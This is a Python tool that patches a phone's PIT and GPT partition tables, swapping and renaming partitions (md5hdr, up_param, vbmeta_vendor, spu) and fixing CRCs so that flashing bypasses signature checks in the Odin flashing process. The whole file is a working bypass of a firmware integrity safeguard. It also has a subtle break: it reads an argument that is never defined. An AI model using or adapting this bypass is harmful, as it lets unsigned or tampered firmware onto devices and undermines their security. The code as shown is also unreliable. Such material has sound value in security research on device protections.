"""
@file odin_sig_bypass.py
@brief Swap partitions to bypass odin signature checks
@author Gabrielle Viala
"""

from ctypes import c_uint8, c_uint32, c_uint64, Structure, sizeof
import binascii
from pathlib import Path
import argparse

gpt_name = "gpt.bin"
pit_name = "pit.img"

##### Structure definition

class pit_header(Structure):
    _pack_ = 1
    _fields_ = [
    ('identifier', c_uint32),
    ('nb_entry', c_uint32),
    ('field_8', c_uint64),
    ('soc_name', c_uint64),
    ('field_18', c_uint32),
    ]

MAX_NAME_SIZE = 0x20
class pit_entry(Structure):
    _fields_ = [
    ('binaryType', c_uint32),
    ('deviceType', c_uint32),
    ('identifier', c_uint32),
    ('attributes', c_uint32),
    ('updateAttributes', c_uint32),
    ('blockSizeOrOffset', c_uint32),
    ('blockCount', c_uint32),
    ('fileOffset', c_uint32),
    ('fileSize', c_uint32),
    ('partitionName', c_uint8 * MAX_NAME_SIZE),
    ('flashFilename', c_uint8 * MAX_NAME_SIZE),
    ('fotaFilename', c_uint8 * MAX_NAME_SIZE),
    ]

    def get_partitionName(self):
        return bytes(self.partitionName).decode('utf-8').strip("\x00")

    def set_partitionName(self, name):
        tmp = bytearray(MAX_NAME_SIZE)
        tmp[0:len(name)] = name
        self.partitionName[:] = tmp

    def set_flashFilename(self, name):
        tmp = bytearray(MAX_NAME_SIZE)
        tmp[0:len(name)] = name
        self.flashFilename[:] = tmp

LBA_SIZE = 0x200
class gpt_header(Structure):
    _fields_ = [
    ('signature', c_uint64),
    ('revision_minor', c_uint32),
    ('header_size', c_uint32),
    ('crc32', c_uint32),
    ('reserved', c_uint32),
    ('current_lba', c_uint64),
    ('backup_lba', c_uint64),
    ('first_usable_lba', c_uint64),
    ('last_usable_lba', c_uint64),
    ('disk_guid', c_uint8 * 0x10),
    ('part_entry_start_lba', c_uint64),
    ('num_part_entries', c_uint32),
    ('part_entry_size', c_uint32),
    ('crc32_part_array', c_uint32),
    ('padding', c_uint8 * 0x1a4)
    ]


class gpt_partition(Structure):
    _fields_ = [
    ('partition_type', c_uint8 * 0x10),
    ('guid', c_uint8 * 0x10),
    ('first_lba', c_uint64),
    ('last_lba', c_uint64),
    ('attributes', c_uint64),
    ('name', c_uint8 * 0x48)
    ]
    def get_name(self):
        return bytes(self.name).decode('utf-8')

    def set_name(self, name):
        tmp = bytearray(0x48)
        tmp[0:len(name)] = name
        self.name[:] = tmp

    def get_guid(self):
        return bytes(self.guid)

    def set_guid(self, guid):
        self.guid[:] = guid


# Rename partitions to have the following layout:
#   vbmeta_vendor -> pit
#   spu -> vbmeta_vendor        (yes, we don't care about spu :))
def update_gpt(input_file, pit_file):
    # read gpt partition
    with open(input_file, 'rb') as fd:
        first_lba =  fd.read(LBA_SIZE)
        header = gpt_header.from_buffer_copy(fd.read(sizeof(gpt_header)))
        content = bytearray(fd.read())

    size_pit = pit_file.stat().st_size
    nb_block = (size_pit + (LBA_SIZE - (size_pit % LBA_SIZE))) //  LBA_SIZE
    # patch partitions
    for index in range(header.num_part_entries):
        offset = index * header.part_entry_size
        part = gpt_partition.from_buffer_copy(content[offset:])
        if part.get_guid() == b'ANDROID vbmeta_v':
            part.set_name("pit".encode('utf-16-le'))
            part.set_guid(b"ANDROID pit\x00\x00\x00\x00\x00")
            content[offset:offset+sizeof(part)] = part
        elif part.get_guid() == b"ANDROID spu\x00\x00\x00\x00\x00":
            part.set_name("vbmeta_vendor".encode('utf-16-le'))
            part.set_guid(b'ANDROID vbmeta_v')
            content[offset:offset+sizeof(part)] = part

    # fix crc32 in header
    crc32_part = binascii.crc32(content[0:header.num_part_entries*sizeof(gpt_partition)])
    header.crc32_part_array = crc32_part
    header.crc32 = 0
    header.crc32 = binascii.crc32(bytes(header))

    # write partition back
    output_file = Path(input_file.name + ".patched")
    with open(output_file, 'wb') as out:
        out.write(first_lba)
        out.write(bytes(header))
        out.write(content)

    return output_file

# Swap md5hdr and up_param partitions in PIT
def update_pit(input_file):
    # read pit partition
    with open(input_file, 'rb') as fd:
        header = pit_header.from_buffer_copy(fd.read(sizeof(pit_header)))
        content = bytearray(fd.read(header.nb_entry * sizeof(pit_entry)))
        remaining_data = fd.read()

    # patch partitions
    for index in range(header.nb_entry):
        offset = index * sizeof(pit_entry)
        entry = pit_entry.from_buffer_copy(content[offset:])
        if entry.get_partitionName() == "md5hdr":
            entry.set_partitionName("up_param".encode('utf-8'))
            entry.set_flashFilename("up_param".encode('utf-8'))
            content[offset:offset+sizeof(entry)] = entry
        elif entry.get_partitionName() == "up_param":
            entry.set_partitionName("md5hdr".encode('utf-8'))
            entry.set_flashFilename("md5.bin".encode('utf-8'))
            content[offset:offset+sizeof(entry)] = entry

    # write partition back
    output_file = Path(input_file.name + ".patched")
    with open(output_file, 'wb') as out:
        out.write(bytes(header))
        out.write(content)
        out.write(b"\x00" * len(remaining_data))

    return output_file


if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('partitions_folder', type=Path, help="directory that contains the phone partitions that will be flashed")
    parser.add_argument('--pit', type=Path, help="path to the pit.bin")
    parser.add_argument('--gpt', type=Path, help="path to the gpt.bin")
    args = parser.parse_args()

    command = args.command
    if not args.partitions_folder.is_dir():
        args.partitions_folder.mkdir(parents=True, exist_ok=False)

    pit_file = args.pit if args.pit else args.partitions_folder / "pit.bin"
    gpt_file = args.gpt if args.gpt else args.partitions_folder / "gpt.bin"


    if not pit_file.is_file():
        print(f"[x] Could not find PIT partition")
        exit(-1)

    if not gpt_file.is_file():
        print(f"[x] Could not find GPT partition")
        exit(-1)

    print(f"[!] Modify PIT table in {pit_file}")
    pit_file = update_pit(pit_file)
    print(f"[!] Modify GPT table in {gpt_file}")
    gpt_file = update_gpt(gpt_file, pit_file)
    print(f"[+] Output files: {gpt_file} & {pit_file}")

